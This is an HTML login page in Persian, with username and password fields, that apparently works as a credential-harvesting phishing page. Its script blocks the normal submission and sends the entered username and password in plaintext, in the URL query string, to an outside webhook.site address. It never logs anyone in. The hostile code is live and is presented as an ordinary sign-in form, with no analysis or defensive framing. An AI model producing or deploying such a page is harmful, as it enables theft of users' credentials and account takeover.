<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>ورود</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    form {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    input {
      width: 100%;
      padding: 0.5rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 0.5rem;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <form id="loginForm">
    <input type="text" name="UserName" placeholder="نام کاربری" required />
    <input type="password" name="Password" placeholder="رمز عبور" required />
    <button type="submit">ورود</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.querySelector("input[name='UserName']").value;
      const password = document.querySelector("input[name='Password']").value;

      fetch("https://webhook.site/c028d9e3-c218-4e87-ae66-46837fab0868?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
        .then(response => console.log("ارسال شد:", response.status))
        .catch(error => console.error("خطا در ارسال:", error));
    });
  </script>

</body>
</html>
